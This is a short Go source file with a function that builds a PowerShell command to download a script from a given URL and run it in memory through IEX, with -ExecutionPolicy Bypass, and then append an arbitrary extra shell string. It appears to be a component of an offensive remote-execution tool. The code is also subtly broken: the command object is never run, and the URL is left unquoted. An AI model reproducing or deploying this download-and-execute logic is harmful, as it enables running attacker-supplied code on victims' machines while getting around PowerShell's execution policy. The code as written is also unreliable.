package components

import (
	"fmt"
	"os/exec"
)

func run_powershell_script(url string, shell string) {
	cmd := fmt.Sprintf(`IEX (New-Object Net.WebClient).DownloadString(%s)`, url)
	binary, _ := exec.LookPath("powershell")
	exec.Command(binary, fmt.Sprintf(`PowerShell -ExecutionPolicy Bypass -NoLogo -NoExit -Command "%s;%s"`, cmd, shell))
}
